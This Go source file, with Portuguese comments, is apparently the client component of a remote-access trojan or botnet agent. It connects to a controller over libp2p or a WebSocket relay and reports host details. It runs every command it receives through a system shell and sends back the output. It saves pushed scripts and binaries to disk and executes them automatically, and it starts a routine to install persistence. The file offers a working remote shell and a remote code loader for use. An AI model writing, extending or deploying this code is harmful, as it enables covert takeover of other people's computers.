package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	corehost "github.com/libp2p/go-libp2p/core/host"
	network "github.com/libp2p/go-libp2p/core/network"
)

const protocolID = "/cmd/1.0.0"

// Variáveis globais para compartilhar entre arquivos
var (
	host       corehost.Host
	clientInfo ClientInfo

	// Configurações de conexão
	connectionMode    string         = "auto" // "local", "public", "auto"
	currentConnection ConnectionType = DISCONNECTED

	// Add these variables for connection management
	connMutex sync.Mutex
	connected bool
)

// Tipos de conexão
type ConnectionType int

const (
	DISCONNECTED ConnectionType = iota
	LOCAL_P2P
	PUBLIC_RELAY
)

type ClientInfo struct {
	Type    string   `json:"type"`
	OS      string   `json:"os"`
	Detail  string   `json:"detail"`
	Modules []string `json:"modules"`
}

type ModuleInfo struct {
	Name     string `json:"name"`
	Content  string `json:"content"`
	Type     string `json:"type"`
	OS       string `json:"os"`
	Required bool   `json:"required"`
}

var (
	modulesDir       = "./client_modules"
	installedModules []string
)

func loadInstalledModules() {
	os.MkdirAll(modulesDir, 0755)
	installedModules = []string{}

	filepath.Walk(modulesDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		installedModules = append(installedModules, info.Name())
		return nil
	})

	fmt.Printf("📦 %d módulos já instalados: %v\n", len(installedModules), installedModules)
}

func installModule(module ModuleInfo) error {
	filePath := filepath.Join(modulesDir, module.Name)

	err := ioutil.WriteFile(filePath, []byte(module.Content), 0755)
	if err != nil {
		return fmt.Errorf("erro ao salvar módulo %s: %v", module.Name, err)
	}

	// Adiciona à lista de módulos instalados
	installedModules = append(installedModules, module.Name)

	// AUTOMATIZAÇÃO: Executa TODOS os módulos baseado no tipo
	switch module.Type {
	case "script":
		executeScript(filePath, module.Name)
	case "binary":
		executeBinary(filePath, module.Name)
	case "config":
		fmt.Printf("⚙️ Arquivo de config instalado: %s\n", module.Name)
	}

	return nil
}

func executeScript(filePath, name string) {
	if strings.HasSuffix(name, ".py") {
		fmt.Printf("🐍 Executando Python: %s\n", name)
		cmd := exec.Command("python", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("❌ Erro Python: %v\n", err)
		} else {
			fmt.Printf("📤 Saída Python: %s\n", output)
		}
	} else if strings.HasSuffix(name, ".go") {
		fmt.Printf("🔧 Compilando e executando Go: %s\n", name)
		cmd := exec.Command("go", "run", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("❌ Erro Go: %v\n", err)
		} else {
			fmt.Printf("📤 Saída Go: %s\n", output)
		}
	} else if strings.HasSuffix(name, ".sh") {
		fmt.Printf("🔧 Executando Shell: %s\n", name)
		cmd := exec.Command("sh", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("❌ Erro Shell: %v\n", err)
		} else {
			fmt.Printf("📤 Saída Shell: %s\n", output)
		}
	} else if strings.HasSuffix(name, ".bat") {
		fmt.Printf("🔧 Executando Batch: %s\n", name)
		cmd := exec.Command("cmd", "/C", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("❌ Erro Batch: %v\n", err)
		} else {
			fmt.Printf("📤 Saída Batch: %s\n", output)
		}
	}
}

func executeBinary(filePath, name string) {
	fmt.Printf("⚙️ Executando binário: %s\n", name)
	cmd := exec.Command(filePath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("❌ Erro binário: %v\n", err)
	} else {
		fmt.Printf("📤 Saída binário: %s\n", output)
	}
}

func handleModulesDownload(reader *bufio.Reader) {
	fmt.Println("📥 Iniciando download de módulos...")
	modulesReceived := 0

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("❌ Erro ao receber módulos:", err)
			return
		}

		line = strings.TrimSpace(line)

		if line == "MODULES_END" {
			fmt.Printf("✅ Download concluído! %d módulos recebidos\n", modulesReceived)
			break
		}

		var module ModuleInfo
		if err := json.Unmarshal([]byte(line), &module); err != nil {
			fmt.Println("❌ Erro ao decodificar módulo:", err)
			continue
		}

		fmt.Printf("📥 Recebendo módulo: %s (%s)\n", module.Name, module.Type)

		if err := installModule(module); err != nil {
			fmt.Printf("❌ Erro ao instalar %s: %v\n", module.Name, err)
		} else {
			fmt.Printf("✅ Módulo %s instalado com sucesso\n", module.Name)
			modulesReceived++
		}
	}
}

func handleStream(s network.Stream, info ClientInfo) {
	if host == nil {
		fmt.Println("⚠️ Host P2P não inicializado (handleStream)")
		return
	}
	// Envia identificação ao servidor
	idBytes, _ := json.Marshal(info)
	s.Write(append(idBytes, '\n'))

	reader := bufio.NewReader(s)
	for {
		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("❌ Conexão P2P interrompida:", err)
			// Marca conexão como perdida
			setConnectionStatus(DISCONNECTED)
			return
		}
		cmdLine = strings.TrimSpace(cmdLine)
		if cmdLine == "" {
			continue
		}

		// Comandos especiais do sistema
		switch cmdLine {
		case "NO_MODULES_NEEDED":
			fmt.Println("✅ Todos os módulos necessários já estão instalados")
			continue

		case "MODULES_DOWNLOAD":
			handleModulesDownload(reader)
			continue

		case "getinfo":
			s.Write([]byte(fmt.Sprintf("Tipo: %s, OS: %s, Detalhe: %s, Módulos: %v\x00",
				info.Type, info.OS, info.Detail, installedModules)))
			continue

		case "listmodules":
			s.Write([]byte(fmt.Sprintf("Módulos instalados: %v\x00", installedModules)))
			continue
		}

		// Executa comando no SO
		executeCommand(cmdLine, s)
	}
}

func executeCommand(cmdLine string, writer interface{}) {
	fmt.Printf("🔧 Executando comando: %s\n", cmdLine)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdLine)
	} else {
		cmd = exec.Command("sh", "-c", cmdLine)
	}
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	cmd.Run()

	// Envia resultado baseado no tipo de writer
	if s, ok := writer.(network.Stream); ok {
		// Conexão P2P
		s.Write(append(out.Bytes(), '\x00'))
	} else if ws, ok := writer.(WebSocketWriter); ok {
		// Conexão WebSocket relay
		ws.WriteMessage(out.String())
	}
}

// Detecta o modo de conexão apropriado
func detectConnectionMode() string {
	// Tenta detectar se está em rede local primeiro
	if isLocalNetworkAvailable() {
		return "local"
	}

	// Se não tem rede local, tenta público
	if isPublicNetworkAvailable() {
		return "public"
	}

	// Se nenhum funcionar, usa modo auto (tenta ambos)
	return "auto"
}

func isLocalNetworkAvailable() bool {
	// Verifica se há servidores P2P locais disponíveis
	// Implementação simplificada - apenas verifica conectividade local
	return true // Por enquanto sempre retorna true
}

func isPublicNetworkAvailable() bool {
	// Verifica se há conectividade com internet
	// Implementação simplificada
	return true // Por enquanto sempre retorna true
}

func setConnectionStatus(status ConnectionType) {
	connMutex.Lock()
	currentConnection = status
	connected = (status != DISCONNECTED)
	connMutex.Unlock()
}

// GetConnectionStatus returns the current connection status
func GetConnectionStatus() ConnectionType {
	connMutex.Lock()
	defer connMutex.Unlock()
	return currentConnection
}

func main() {
	fmt.Println("🚀 Iniciando cliente híbrido (Local + Público) com persistência...")

	// Load configuration first
	LoadConfig()

	// If this is first run, prompt for configuration
	if appConfig.FirstRun {
		PromptForConfiguration()
	}

	// Set connection mode from config
	connectionMode = appConfig.ConnectionMode

	// Carrega módulos já instalados
	loadInstalledModules()

	// Inicializa host P2P
	h, err := libp2p.New()
	if err != nil {
		fmt.Printf("⚠️ Erro ao inicializar P2P: %v\n", err)
		// Continua sem P2P se falhar
	} else {
		host = h
		fmt.Println("✅ Host P2P inicializado")
	}

	// Detecta modo de conexão
	connectionMode = detectConnectionMode()
	fmt.Printf("🔍 Modo de conexão detectado: %s\n", connectionMode)

	// Inicia instalação de mecanismos de persistência em background
	go func() {
		time.Sleep(3 * time.Second)
		fmt.Println("⚙️ Instalando mecanismos de persistência...")
		installPersistence()
	}()

	// Define informações do cliente
	clientInfo = ClientInfo{
		Type:    "hybrid-client",
		OS:      runtime.GOOS,
		Detail:  "Cliente híbrido com suporte P2P e Relay",
		Modules: installedModules,
	}

	// Inicia sistema de monitoramento e conexão híbrida
	go startHybridConnectionManager()

	// Log initial connection status
	go func() {
		for {
			status := GetConnectionStatus()
			var statusText string

			switch status {
			case DISCONNECTED:
				statusText = "Desconectado"
			case LOCAL_P2P:
				statusText = "P2P Local"
			case PUBLIC_RELAY:
				statusText = "Relay Público"
			}

			fmt.Printf("📡 Status de conexão atual: %s\n", statusText)
			time.Sleep(5 * time.Minute)
		}
	}()

	// Mantém o programa em execução
	fmt.Println("🔄 Sistema híbrido ativo - aguardando comandos...")
	select {} // Bloqueia indefinidamente
}
